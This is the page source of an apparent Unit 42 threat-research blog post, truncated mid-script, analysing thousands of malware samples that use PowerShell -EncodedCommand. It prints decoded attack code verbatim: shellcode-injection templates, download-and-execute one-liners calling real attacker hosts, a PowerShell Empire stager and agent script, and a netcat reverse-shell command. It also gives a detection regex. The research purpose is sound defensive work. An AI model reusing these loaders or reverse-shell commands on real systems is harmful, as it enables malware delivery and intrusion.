
<!doctype html>
<html >
  <head>
  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <link rel="apple-touch-icon" sizes="180x180" href="https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v4/favicon/icon-Unit42-180x180.png">
	<link rel="icon" type="image/png" sizes="32x32" href="https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v4/favicon/icon-Unit42-32x32.png">
	<link rel="icon" type="image/png" sizes="16x16" href="https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v4/favicon/icon-Unit42-16x16.png">
	<link rel="manifest" href="https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v4/favicon/site.webmanifest">
	<link rel="mask-icon" href="https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v4/favicon/safari-pinned-tab.svg" color="#000000">
	<meta name="msapplication-TileColor" content="#000000">
	<meta name="theme-color" content="#000">
  <link rel="alternate" hreflang="en" href="https://unit42.paloaltonetworks.com/unit42-pulling-back-the-curtains-on-encodedcommand-powershell-attacks/" />
<link rel="alternate" hreflang="ja" href="https://unit42.paloaltonetworks.jp/unit42-pulling-back-the-curtains-on-encodedcommand-powershell-attacks/" />

	<!-- This site is optimized with the Yoast SEO plugin v15.2.1 - https://yoast.com/wordpress/plugins/seo/ -->
	<title>Pulling Back the Curtains on EncodedCommand PowerShell Attacks</title>
	<meta name="robots" content="index, follow, max-snippet:-1, max-image-preview:large, max-video-preview:-1" />
	<link rel="canonical" href="https://unit42.paloaltonetworks.com/unit42-pulling-back-the-curtains-on-encodedcommand-powershell-attacks/" />
	<meta property="og:locale" content="en_US" />
	<meta property="og:type" content="article" />
	<meta property="og:title" content="Pulling Back the Curtains on EncodedCommand PowerShell Attacks" />
	<meta property="og:description" content="This post is also available in: 日本語 (Japanese)A note to readers: The code samples included within this blog post may trigger alerts from your security software. Please note that this does not indicate an infection or an attack; rather, it is a notification that the code could be malicious if it were live. PowerShell has..." />
	<meta property="og:url" content="https://unit42.paloaltonetworks.com/unit42-pulling-back-the-curtains-on-encodedcommand-powershell-attacks/" />
	<meta property="og:site_name" content="Unit42" />
	<meta property="article:published_time" content="2017-03-10T13:00:41+00:00" />
	<meta property="og:image" content="https://unit42.paloaltonetworks.com/wp-content/uploads/2016/09/unit42-web-banner-650x300.jpg" />
	<meta property="og:image:width" content="650" />
	<meta property="og:image:height" content="300" />
	<meta name="twitter:card" content="summary_large_image" />
	<meta name="twitter:label1" content="Written by">
	<meta name="twitter:data1" content="Jeff White">
	<meta name="twitter:label2" content="Est. reading time">
	<meta name="twitter:data2" content="41 minutes">
	<script type="application/ld+json" class="yoast-schema-graph">{"@context":"https://schema.org","@graph":[{"@type":"WebSite","@id":"https://unit42.paloaltonetworks.com/#website","url":"https://unit42.paloaltonetworks.com/","name":"Unit42","description":"Palo Alto Networks","potentialAction":[{"@type":"SearchAction","target":"https://unit42.paloaltonetworks.com/?s={search_term_string}","query-input":"required name=search_term_string"}],"inLanguage":"en-US"},{"@type":"ImageObject","@id":"https://unit42.paloaltonetworks.com/unit42-pulling-back-the-curtains-on-encodedcommand-powershell-attacks/#primaryimage","inLanguage":"en-US","url":"https://unit42.paloaltonetworks.com/wp-content/uploads/2016/09/unit42-web-banner-650x300.jpg","width":650,"height":300},{"@type":"WebPage","@id":"https://unit42.paloaltonetworks.com/unit42-pulling-back-the-curtains-on-encodedcommand-powershell-attacks/#webpage","url":"https://unit42.paloaltonetworks.com/unit42-pulling-back-the-curtains-on-encodedcommand-powershell-attacks/","name":"Pulling Back the Curtains on EncodedCommand PowerShell Attacks","isPartOf":{"@id":"https://unit42.paloaltonetworks.com/#website"},"primaryImageOfPage":{"@id":"https://unit42.paloaltonetworks.com/unit42-pulling-back-the-curtains-on-encodedcommand-powershell-attacks/#primaryimage"},"datePublished":"2017-03-10T13:00:41+00:00","dateModified":"2017-03-10T13:00:41+00:00","author":{"@id":"https://unit42.paloaltonetworks.com/#/schema/person/f83c89677a39d3f7485695f9ad487435"},"inLanguage":"en-US","potentialAction":[{"@type":"ReadAction","target":["https://unit42.paloaltonetworks.com/unit42-pulling-back-the-curtains-on-encodedcommand-powershell-attacks/"]}]},{"@type":"Person","@id":"https://unit42.paloaltonetworks.com/#/schema/person/f83c89677a39d3f7485695f9ad487435","name":"Jeff White","image":{"@type":"ImageObject","@id":"https://unit42.paloaltonetworks.com/#personlogo","inLanguage":"en-US","url":"https://unit42.paloaltonetworks.com/wp-content/uploads/2018/11/unit-news-meta.svg","caption":"Jeff White"},"description":"Principal threat researcher, enterprise R&amp;D, FWaaP, Palo Alto Networks"}]}</script>
	<!-- / Yoast SEO plugin. -->


<link rel='dns-prefetch' href='//www.google.com' />
<link rel='dns-prefetch' href='//s.w.org' />
<link rel="alternate" type="application/rss+xml" title="Unit42 &raquo; Pulling Back the Curtains on EncodedCommand PowerShell Attacks Comments Feed" href="https://unit42.paloaltonetworks.com/unit42-pulling-back-the-curtains-on-encodedcommand-powershell-attacks/feed/" />
<meta property="og:likes" content="9"/>
<meta property="og:readtime" content="29"/>
<meta property="og:views" content="152,030"/>
<meta property="og:date_created" content="March 10, 2017 at 5:00 AM"/>
<meta property="og:post_length" content="10211"/>
<meta property="og:category" content="Unit 42"/>
<meta property="og:category_link" content="https://unit42.paloaltonetworks.com/category/unit42/"/>
<meta property="og:author" content="Jeff White"/>
<meta property="og:authorlink" content="https://unit42.paloaltonetworks.com/author/jeff-white/"/>
<meta property="og:author_image_link" content="https://unit42.paloaltonetworks.com/wp-content/uploads/2018/11/unit-news-meta.svg"/>
<script type="application/ld+json">{"@context":"https:\/\/schema.org","@type":"BlogPosting","headline":"Pulling Back the Curtains on EncodedCommand PowerShell Attacks","name":"Pulling Back the Curtains on EncodedCommand PowerShell Attacks","description":"This post is also available in: \u65e5\u672c\u8a9e (Japanese)A note to readers: The code samples included within this blog post may trigger alerts from your security software. Please note that this does not indicate an infection or an attack; rather, it is a notification that the code could be malicious if it were live. PowerShell has...","url":"https:\/\/unit42.paloaltonetworks.com\/unit42-pulling-back-the-curtains-on-encodedcommand-powershell-attacks\/","mainEntityOfPage":"https:\/\/unit42.paloaltonetworks.com\/unit42-pulling-back-the-curtains-on-encodedcommand-powershell-attacks\/","datePublished":"March 10, 2017","articleBody":"A note to readers: The code samples included within this blog post may trigger alerts from your security software. Please note that this does not indicate an infection or an attack; rather, it is a notification that the code could be malicious if it were live.\n\nPowerShell has continued to gain in popularity over the past few years as the framework continues to mature, so it\u2019s no surprise we\u2019re seeing it in more attacks. PowerShell offers attackers a wide range of capabilities natively on the system and with a quick look at the landscape of malicious PowerShell tools flooding out; you have a decent indicator of its growth.\n\nMicrosoft has done a fantastic job in later versions of PowerShell by giving multiple ways to log PowerShell activity (Transcription, ScriptBlock, etc) so there has been a shift to try and further obfuscate attacks at runtime.\n\nEnter stage left - the PowerShell \u2018-EncodedCommand\u2019 parameter!\n-EncodedCommand\n    Accepts a base64-encoded string version of a command. Use this parameter\n    to submit commands to Windows PowerShell that require complex quotation\n    marks or curly braces.\n\nAs shown above from the PowerShell Help output, it\u2019s a command intended to take complex strings that may otherwise cause issues for the command-line and wrap them up for PowerShell to execute. By masking the \u201cmalicious\u201d part of your command from prying eyes you can avoid strings that may tip-off the defense.\n\nThe purpose of this blog will be two-fold. First, in the \u201cAnalysis Overview\u201d, I will be analyzing 4,100 recent samples identified within Palo Alto Networks AutoFocus that employ this EncodedCommand technique to see how PowerShell is being used and what techniques are being used in the wild for PowerShell attacks. Second, I will be using this blog to catalog the PowerShell code with examples of each decoded sample to aide in future identification or research.\nAnalysis Overview\nTo perform this analysis, I needed to first identify samples that were using this technique. Because PowerShell gives you a lot of flexibility when it comes to calling different parameters, identifying samples isn\u2019t as straightforward as one might expect.\n\nBelow are three examples of different ways the EncodedCommand parameter can be called:\n\n \tFully spelled out:\npowershell.exe \u2013EncodedCommand ZQBjAGgAbwAgACIARABvAHIAbwB0AGgAeQAiAA==\n \tTruncated with alternate capitalization:\npowershell.exe \u2013eNco ZQBjAGgAbwAgACIAVwBpAHoAYQByAGQAIgA=\n \tUsing caret escape-character injection to break-up the string:\npowershell.exe \u2013^e^C^ ZQBjAGgAbwAgACIAVwBpAHQAYwBoACIA\n\nThere are well over 100,000 variations possible by using combinations of these methods for the \u201cEncodedCommand\u201d parameter alone. Keeping that in mind, I came up with the below regex that gave decent coverage to the possible variants and could easily be applied to a huge corpus of dynamic analysis reports.\n\\-[Ee^]{1,2}[NnCcOoDdEeMmAa^]+ [A-Za-z0-9+\/=]{5,}\n\nThis allows for extraction of lines like the below at scale for further analysis.\npowerShell.exe  -WindowStyle hiddeN -ExecuTionPolicy ByPasS -enc \ncgBlAGcAcwB2AHIAMwAyACAALwB1ACAALwBzACAALwBpADoAaAB0AHQAcAA6\nAC8ALwAxADkAMgAuADEANgA4AC4ANAA4AC4AMQAyADkALwB0AGUAcwB0AC4\nAagBwAGcAIABzAGMAcgBvAGIAagAuAGQAbABsAAoA\nNow, it\u2019s no surprise but the majority of the encoded data is clearly generated from templates and public tools - attackers aren\u2019t re-inventing the wheel every time they need to run shellcode or download another malicious file.\u00a0 This is evidenced by the fact that the underlying code is almost identical with just slight adjustments to download locations and the like. To try and perform analysis on the data then, I needed to try and identify the code and attempt to determine what generated the code, or at minimum, attempt to cluster the code into like-buckets.\nProfiling Approach\nTo illustrate some of the difficulties involved with this, back in 2012 Matthew Graeber published a blog post about a PowerShell script he put together that could load shellcode into memory and execute it. This script has been the cornerstone template for this technique, being used in most public tools that seek to use this functionality.\n\nFollowing are two iterations of the technique from TrustedSec tools Social-Engineer Toolkit (SET) and Magic Unicorn. If you compare the two samples, you\u2019ll see that SET uses \u201c$c\u201d whereas Magic Unicorn uses \u201c$nLR\u201d for the initial variable. Similarly, the \u201c$size\u201d variable in SET is \u201c$g\u201d in Magic Unicorn, the \u201c$sc\u201d variable is \u201c$z\u201d, and finally the \u201c$x\u201d variable is \u201c$kuss\u201d.\n\nSET\n$c = '[DllImport(\"kernel32.dll\")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(\"kernel32.dll\")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(\"msvcrt.dll\")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name \"Win32\" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$sc = ;$size = 0x1000;if ($sc.Length -gt 0x1000){$size = $sc.Length};$x=$w::VirtualAlloc(0,0x1000,$size,0x40);for ($i=0;$i -le ($sc.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $sc[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};\n\nMagic Unicorn\n$nLR = '[DllImport(\"kernel32.dll\")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(\"kernel32.dll\")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(\"msvcrt.dll\")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $nLR -Name \"Win32\" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = ;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$kuss=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($kuss.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$kuss,0,0,0);for (;;){Start-sleep 60};\n\nIn Magic Unicorn, there is a line within the generating script that randomizes some variables. Below is an excerpt showing how this works.\nvar1 = generate_random_string(3, 4)\nvar2 = generate_random_string(3, 4)\n\npowershell_code = (\n        r\"\"\"$1 = '$c = ''[DllImport(\"kernel32.dll\")]public static extern IntPtr \u2026\n\npowershell_code = powershell_code.replace(\"$1\", \"$\" + var1).replace(\"$c\", \"$\" + var2).replace(\"$2\", \"$\" + var3) \u2026\n\nThis simply replaces some variables with a string of 3-4 random alphanumeric characters; however, not all variables get replaced so the combination of the random string with known anchors allows me to theorize how it was generated. Alternatively, I can also see when it looks like this particular piece of code was copied into another tool without the randomization part of the Magic Unicorn script as the variables don\u2019t change or was further built upon by adding additional randomization.\n\nIt\u2019s not an exact science and, when dealing with code that has been heavily re-used over many years by many different people, you\u2019re bound to run into scenarios where the code just doesn\u2019t lend itself well to profiling. I\u2019ve attempted to classify it as accurately as possible but a word of caution - take the specific names with a grain of salt throughout this analysis as nothing is stopping someone simply copying and pasting the code into their own tool.\n\nIn total, I profiled 27 clusters of public tools or capabilities, which had unique identifiers to separate them apart from the rest. I\u2019ll get into each of them later as I catalog each variant but, for now, the below table offers a breakdown of the variants, how many samples matched, and the overall percentage it accounted for in the sample set.\n\n&nbsp;\n\n\n\nVariant\nCount\n% of Total\n\n\nDownloader DFSP\n1,373\n33.49%\n\n\nShellcode Inject\n1,147\n27.98%\n\n\nUnicorn\n611\n14.90%\n\n\nPowerShell Empire\n293\n7.15%\n\n\nSET\n199\n4.85%\n\n\nUnknown\n104\n2.54%\n\n\nPowerfun Reverse\n100\n2.44%\n\n\nDownloader DFSP 2X\n81\n1.98%\n\n\nDownloader DFSP DPL\n24\n0.59%\n\n\nDownloader IEXDS\n19\n0.46%\n\n\nPowerWorm\n19\n0.46%\n\n\nUnicorn Modified\n14\n0.34%\n\n\nScheduled Task COM\n11\n0.27%\n\n\nBITSTransfer\n11\n0.27%\n\n\nVB Task\n10\n0.24%\n\n\nTXT C2\n10\n0.24%\n\n\nDownloader Proxy\n9\n0.22%\n\n\nAMSI Bypass\n8\n0.20%\n\n\nVeil Stream\n7\n0.17%\n\n\nMeterpreter RHTTP\n6\n0.15%\n\n\nDynAmite Launcher\n6\n0.15%\n\n\nDownloader Kraken\n5\n0.12%\n\n\nAppLocker Bypass\n4\n0.10%\n\n\nPowerSploit GTS\n3\n0.07%\n\n\nPowerfun Bind\n2\n0.05%\n\n\nRemove AV\n2\n0.05%\n\n\nDynAmite KL\n1\n0.02%\n\n\n\n&nbsp;\n\nOver half of the samples analyzed utilized either a generic \u201cDownloadFile-StartProcess\u201d technique or a variant of the shellcode injection technique shown previously.\nGeneral Distribution \/ Stats\nAcross the 4,100 samples, there were 4 file formats seen.\n\n\n\nFile Format\nCount\n% of Total\n\n\n\"exe\"\n2,154\n52.54%\n\n\n\"doc\"\n1,717\n41.88%\n\n\n\"xls\"\n228\n5.56%\n\n\n\"dll\"\n1\n0.02%\n\n\n\n&nbsp;\n\nEXE and DOC format account for the majority of extensions used across this sample set. Looking further at the DOC files, 77% of them, 1,326, matched the \u201cDownloader DFSP\u201d variant, which defines a generic downloader using the DownloadFile-StartProcess method as shown below.\n (New-Object System.Net.WebClient).DownloadFile('http:\/\/94.102.53.238\/~yahoo\/csrsv.exe',\"$env:APPDATA\\csrsv.exe\");Start-Process (\"$env:APPDATA\\csrsv.exe\")\n\nPivoting from there, 1,159 of the DOC files (87%) match known patterns for Cerber ransomware; the implication is that a tool is being used to generate the malicious Microsoft Word Documents that create the macro which launches PowerShell with this technique as the template.\n\nThe primary method of delivery across the DOC samples is SMTP\/POP3, which aligns with the status quo of delivering ransomware by using malicious Microsoft Word Documents via e-mail campaigns.\n\n\n\nFigure 1 Applications used to deliver malicious Powershell Word Documents\n\nLooking at the target industries also shows a fairly even distribution throughout Higher Education, High Tech, Professional and Legal Services, and Healthcare.\n\n\n\nFigure 2 Breakdown of Industries detecting malicious Powershell Word Documents\n\nA quick look at the distribution over time also shows a number of large spikes that, again, aligns with the standard operating procedure of e-mail campaigns.\n\n\n\nFigure 3 Number of malicious Powershell Word Documents captured in AutoFocus over the last 12 months\n\nLooking at how the EXE samples were classified, nothing stands out as being dominant in terms of a group or malware family; however, interestingly enough there seems to be a preference for targeting companies in the High Tech industry.\n\n\n\nFigure 4 Breakdown of Industries detecting malicious Executables using Powershell\n\nThe distribution over time is also fairly even in comparison to the DOC sample distribution over time.\n\n\n\nFigure 5 Number of malicious Executables using Powershell captured in AutoFocus over the last 12 months\n\nOne possible explanation for this is a variation is distribution. For example, while DOC samples were primarily seen as attachments to e-mail, EXE samples were usually delivered through Web Browsing.\n\nThe last item I\u2019ll touch on before diving into the commands themselves is the one DLL file that was detected using the EncodedCommand technique. This DLL contains no exports but when called with the DLLMain entry point will simply launch a PowerShell Empire stager which downloads an XOR\u2019d script from a website and then uses PowerShell\u2019s Invoke-Expression cmdlet to run the downloaded script. This sample was related to the Odinaff family that Symantec blogged about in October 2016.\nPre-Analysis Data \/ Stats\nBefore looking at the base64 encoded data, I looked at how each process was launched. This frequency analysis and inspection gives some insight into what additional parameters are being used alongside EncodedCommand.\n\nEncodedCommand: (4,100 Samples \u2013 100% Coverage)\n\nUsed to pass a base64 encoded string to PowerShell for execution.\n\n\n\nFlag\nCount\n% of Total\n\n\n\"-enc\"\n3,407\n83.29%\n\n\n\"-Enc\"\n412\n10.05%\n\n\n\"-EncodedCommand\"\n229\n5.59%\n\n\n\"-encodedcommand\"\n40\n0.98%\n\n\n\"-encodedCommand\"\n7\n0.17%\n\n\n\"-ec\"\n3\n0.07%\n\n\n\"-en\"\n1\n0.02%\n\n\n\"-ENC\"\n1\n0.02%\n\n\n\n&nbsp;\n\nWindowStyle Hidden: (2,083 Samples \u2013 50.8% Coverage)\n\nUsed to prevent PowerShell from displaying a window when it executes code. The most used variant \u201c-window hidden\u201d is due to the PowerShell command that the previously mentioned Microsoft Word Documents distributing Cerber are using.\n\n\n\nFlag\nCount\n% of Total\n\n\n\"-window hidden\"\n1,267\n30.90%\n\n\n\"-W Hidden\"\n315\n7.68%\n\n\n\"-w hidden\"\n159\n3.88%\n\n\n\"-windowstyle hidden\"\n125\n3.05%\n\n\n\"-win hidden\"\n67\n1.63%\n\n\n\"-WindowStyle Hidden\"\n45\n1.10%\n\n\n\"-win Hidden\"\n42\n1.02%\n\n\n\"-wind hidden\"\n40\n0.98%\n\n\n\"-WindowStyle hidden\"\n5\n0.12%\n\n\n\"-WindowStyle hiddeN\"\n5\n0.12%\n\n\n\"-windows hidden\"\n4\n0.10%\n\n\n\"-Win Hidden\"\n3\n0.07%\n\n\n\"-win hid\"\n2\n0.05%\n\n\n\"-Window hidden\"\n2\n0.05%\n\n\n\"-Wind Hidden\"\n1\n0.02%\n\n\n\"-Win hidden\"\n1\n0.02%\n\n\n\n&nbsp;\n\nNonInteractive: (1,405 Samples \u2013 42.4% Coverage)\n\nUsed to prevent creating an interactive prompt for the user. Used in combination with WindowStyle Hidden to hide signs of execution. For the \u201c-noni\u201d variation, 76% were the generic shellcode injection code and SET, whereas \u201c-NonI\u201d was PowerShell Empire.\n\n\n\nFlag\nCount\n% of Total\n\n\n\"-noni\"\n1,042\n25.41%\n\n\n\"-NonI\"\n331\n8.07%\n\n\n\"-noninteractive\"\n27\n0.66%\n\n\n\"-NonInteractive\"\n4\n0.10%\n\n\n\"-nonI\"\n1\n0.02%\n\n\n\n&nbsp;\n\nNoProfile: (1,350 Samples \u2013 32.9% Coverage)\n\nPrevents PowerShell from loading profile scripts, which get executed on launch, so as to avoid potentially unwanted commands or settings. Similar to the breakdown for NonInteractive, \u201c-nop\u201d is primarily SET and the generic shellcode injection while \u201c-NoP\u201d is PowerShell Empire.\n\n\n\nFlag\nCount\n% of Total\n\n\n\"-nop\"\n955\n23.29%\n\n\n\"-NoP\"\n332\n8.10%\n\n\n\"-noprofile\"\n57\n1.39%\n\n\n\"-NoProfile\"\n5\n0.12%\n\n\n\"-noP\"\n1\n0.02%\n\n\n\n&nbsp;\n\nExecutionPolicy ByPass: (453 Samples \u2013 11% Coverage)\n\nBypasses the default PowerShell script execution policy (Restricted) and will not block the execution of any scripts or create any prompts. It\u2019s interesting to note that the code executed within EncodedCommand parameter does not apply to the execution policy.\n\n\n\nFlag\nCount\n% of Total\n\n\n\"-ep bypass\"\n128\n3.12%\n\n\n\"-exec bypass\"\n80\n1.95%\n\n\n\"-executionpolicy bypass\"\n78\n1.90%\n\n\n\"-Exec Bypass\"\n73\n1.78%\n\n\n\"-ExecutionPolicy ByPass\"\n42\n1.02%\n\n\n\"-ExecutionPolicy bypass\"\n26\n0.63%\n\n\n\"-Exec ByPass\"\n9\n0.22%\n\n\n\"-ExecutionPolicy Bypass\"\n5\n0.12%\n\n\n\"-ExecuTionPolicy ByPasS\"\n4\n0.10%\n\n\n\"-exe byPass\"\n2\n0.05%\n\n\n\"-ep Bypass\"\n2\n0.05%\n\n\n\"-ExecutionPolicy BypasS\"\n2\n0.05%\n\n\n\"-Exe ByPass\"\n2\n0.05%\n\n\n\n&nbsp;\n\nSta: (219 Samples - 5.3% Coverage)\n\nUses single-threaded apartment (now default as of PowerShell 3.0). This parameter was almost exclusively used in PowerShell Empire.\n\n\n\nFlag\nCount\n% of Total\n\n\n\"-sta\"\n\u00a0219\n\u00a05.34%\n\n\n\n&nbsp;\n\nNoExit: (23 Samples - 0.5% Coverage)\n\nPrevents PowerShell from exiting after running the startup commands. This was exclusively used by the PowerWorm malware and was the only parameter used beside EncodedCommand.\n\n\n\nFlag\nCount\n% of Total\n\n\n\"-noexit\"\n\u00a023\n\u00a00.56%\n\n\n\n&nbsp;\n\nExecutionPolicy Hidden (5 Samples - 0.12% Coverage)\n\nThis actually isn\u2019t a valid policy so PowerShell just ignores it. Every usage of it is related to a script I labeled \u201cTXT C2\u201d, which attempts to load a DNS TXT Record containing another PowerShell script, similar to PowerWorm. Most likely, the attacker meant to use ByPass here as they already have \u201c-w hidden\u201d later in their command.\n\n\n\nFlag\nCount\n% of Total\n\n\n\"-ep hidden\"\n\u00a05\n\u00a00.12%\n\n\n\n&nbsp;\n\nNoLogo: (33 Samples - 0.8% Coverage)\n\nHides the copyright banner when PowerShell launches.\n\n\n\nFlag\nCount\n% of Total\n\n\n\"-Nol\"\n10\n0.24%\n\n\n\"-NoL\"\n10\n0.24%\n\n\n\"-nologo\"\n9\n0.22%\n\n\n\"-nol\"\n4\n0.10%\n\n\n\n&nbsp;\n\nExecutionPolicy Unrestricted (1 Samples \u2013 0.02% Coverage)\n\nSimilar to ByPass, but will warn the user before running unsigned scripts downloaded from the Internet. The underlying lone script that used this parameter tries to execute a script downloaded from the Internet, which should generate a warning.\n\n\n\nFlag\nCount\n% of Total\n\n\n\"-ExecutionPolicy Unrestricted\"\n\u00a01\n\u00a00.02%\n\n\n\n&nbsp;\n\nCommand (1 Samples \u2013 0.02% Coverage)\n\nExecutes a command that follows the parameter as if they were typed at the PowerShell prompt. I only saw one instance of this and it was tied directly to a piece of malware that FireEye included in a blog about evading signature-based detections. The PowerShell code is included in the \u201cComments\u201d field of a DOCM file and launched from a macro inside a Microsoft Word document. Below is the code in question that chains together multiple commands to perform an FTP transfer and subsequent NetCat connection.\npowershell -noP -nonI -Win hidden -c sc ftp.txt -val \\\"open\\\" -enc ascii; ac ftp.txt -val \\\"192.168.52.129\\\" -enc ascii; ac ftp.txt -val \\\"test\\\" -enc ascii; ac ftp.txt -val \\\"test\\\" -enc ascii; ac ftp.txt -val \\\"bin\\\" -enc ascii; ac ftp.txt -val \\\"GET\\\" -enc ascii; ac ftp.txt -val \\\"nc.exe\\\" -enc ascii; ac ftp.txt -val \\\"nc.exe\\\" -enc ascii; ac ftp.txt -val \\\"bye\\\" -enc ascii; ftp -s:ftp.txt; rm ftp.txt; .\/nc.exe -e powershell.exe 192.168.52.129 3724\n\n\n\n\nFlag\nCount\n% of Total\n\n\n\"-c\"\n\u00a01\n\u00a00.02%\n\n\n\n&nbsp;\n\nFinally, I\u2019ll end the parameter analysis by looking briefly at the top 10 combinations seen throughout this sample set.\n\n\n\nFlag Combination\nCount\n% of Total\n\n\n\"-window hidden -enc\"\n1,242\n30.29%\n\n\n\"-enc\"\n986\n24.04%\n\n\n\"-nop -noni -enc\"\n736\n17.95%\n\n\n\"-NoP -sta -NonI -W Hidden -Enc\"\n206\n5.02%\n\n\n\"-EncodedCommand\"\n169\n4.12%\n\n\n\"-ep bypass -noni -w hidden -enc\"\n102\n2.48%\n\n\n\"-NoP -NonI -W Hidden -Enc\"\n60\n1.46%\n\n\n\"-nop\u00a0 -win hidden -noni -enc\"\n57\n1.39%\n\n\n\"-executionpolicy bypass -windowstyle hidden -enc\"\n51\n1.24%\n\n\n\"-nop -exec bypass -win Hidden -noni -enc\"\n41\n1.00%\n\n\n\n&nbsp;\n\nEven accounting for changes in case, the results only increase by a handful of samples in each category.\n\nWhile doing the research to try and identify unique signatures for identification, I found multiple examples of the below, wherein the code author changes the parameters for a newer version of their tool.\n\n\n\nFigure 6 Code Author Modified parameters between versions of a tool\n\nThis reduces the overall aggregate count for those families but I don\u2019t believe it has much impact on the totals. In my review of the tools, authors are less focused on the dynamic ordering of the parameters or potentially dynamically adjusting parameter length to further obscure their attacks; instead they add in basic capitalization randomization and focus on the \u201cmeat\u201d of their code. This can allow for some low-fidelity profiling based on just the way the PowerShell command is launched.\n\nIn addition, the top three combinations, which account for 72% of all combinations, are predominately straightforward and focused on just running code versus any clever attempts at further hiding their attacks from the user.\nPost-Analysis Data \/ Stats\nNext I\u2019ll go over each of the identified variants and review their functionality. For each one that downloads a file or script, I\u2019ll include the observed IP\/Domain\/URL at the end of this blog. Some of these may be malicious, some of them may be pentesters, and some of them may be people doing random testing of new techniques; unfortunately, it\u2019s not usually possible to infer intention when doing bulk analysis but the data is provided for the reader to use as they see fit.\n\nDownloaders\n\nPowerShell code identified with the primary intention of downloading and running a secondary payload or executing PowerShell code obtained remotely.\n\nDownloader DFSP (1,373 Samples - 33.49% Coverage)\n\nThis is a quintessential example of using PowerShell to download and run a file. It\u2019s basically verbatim of the results you get when using Google to search for ways to download and run a file. As such, I\u2019ve used the below template as a generic classification for the base64 encoded data that acts as a simple downloader for the true payload.\n (New-Object System.Net.WebClient).DownloadFile('http:\/\/cajos[.]in\/0x\/1.exe','mess.exe');Start-Process 'mess.exe'\n\nAs was previously pointed out, almost all of the detections matching this category were linked back to the Microsoft Word documents launching this PowerShell command via a macro to download Cerber. One unique pattern observed in this sample was the usage of environment variables, in addition to their URI pattern.\n\nDownloader for Cerber \u2013\n (New-Object System.Net.WebClient).DownloadFile('http:\/\/94.102.53[.]238\/~yahoo\/csrsv.exe',\"$env:APPDATA\\csrsv.exe\");Start-Process (\"$env:APPDATA\\csrsv.exe\")\n\nPowerShell Empire (293 Samples \u2013 7.15% Coverage)\n\nFor this next one, the samples are using PowerShell Empire\u2019s EncryptedScriptDropper to download a script remotely and decrypt it with an embedded XOR key.\n$Wc=NeW-ObjeCt SySTEM.Net.WebCLiEnt;$u='Mozilla\/5.0 (Windows NT 6.1; WOW64; Trident\/7.0; rv:11.0) like Gecko';$WC.HeadeRS.ADd('User-Agent',$u);$wc.PrOxy = [SyStem.NeT.WEbReQUeSt]::DEFauLTWeBProxy;$WC.PRoXY.CrEdENTIaLS = [SYStEM.NeT.CReDEnTiALCaChE]::DEFaulTNeTworKCREdeNtiaLS;$K='0192023a7bbd73250516f069df18b500';$i=0;[CHAr[]]$B=([CHaR[]]($wc.DOwnloaDSTRing(\"http:\/\/23.239.12.15:8080\/index.asp\")))|%{$_-BXOr$k[$i++%$K.LENgTh]};IEX ($B-jOIn'')\n\nIn this example, the XOR key is \u201c0192023a7bbd73250516f069df18b500\u201d and the pulled down script, once decoded with that key, is the PowerShell Empire agent stager script that will POST system information to the C2 server and then download the encrypted Stage 1 Empire payload.\n'FunCtION StaRt-NegoTiATe{param($s,$SK,$UA=\"lol\")Add-TypE -AsSeMBLY SYSteM.SECUriTY;AdD-TypE -aSSEMBly SYSTEm.CoRe;$ErrorActionPreference = \"SilentlyContinue\";$E=[SYstem.TExT.ENCoDING]::ASCII;$AES=NeW-OBjecT SYsTeM.SeCURiTy.CRyptoGrapHY.AESCRyPToSeRVicePrOvIdER;$IV = [BYTE] 0..255 | GeT-RandOm -coUNt 16;$AES.Mode=\"CBC\"; $AES.Key=$e.GetBytes($SK); $AES.IV = $IV;$cSp = NEW-OBJECT SYStEM.SecURity.CrYPtOGRAPHy.CSpPaRAmeTERS;$csP.FLAGs = $cSP.FlagS -boR [SYsTeM.SeCurITY.CryptogRaphy.CsPPROViDErFlAGs]::UsEMAcHINEKeySTore;$Rs = NEW-ObJecT SySTEm.SecURIty.CRyptograPHy.RSACRYPTOSERvICEPROViDeR -ARGuMenTLIsT 2048,$CSP;$rk=$Rs.TOXMlStriNg($FALse);$r=1..16|FOrEacH-ObJEcT{GEt-RANDOm -MAx 26};$ID=(\\'ABCDEFGHKLMNPRSTUVWXYZ123456789\\'[$r] -joIN \\'\\');$iB=$E.gEtbYTes($Rk);$eb=$IV+$AES.CReaTeENCRyptoR().TRANSFoRmFiNalBLOcK($Ib,0,$Ib.LENgtH);IF(-Not $wc){$wc=nEw-oBJECt sYstEM.Net.WEBCLient;$WC.ProxY = [SySTem.NET.WeBReqUEsT]::GETSysTeMWEbPRoxY();$Wc.Proxy.CrEDentIals = [SYStem.Net.CredENtIalCAche]::DEFAUlTCRedentIaLs;}$wc.Headers.Add(\"User-Agent\",$UA);$wc.Headers.Add(\"Cookie\",\"SESSIONID=$ID\");$raw=$wc.UploadData($s+\"index.jsp\",\"POST\",$eb);$dE=$E.GETSTRing($Rs.deCrYPt($raw,$FalSE));$EpOCh=$de[0..9] -joIN\\'\\';$KeY=$dE[10..$de.LengTH] -jOIn 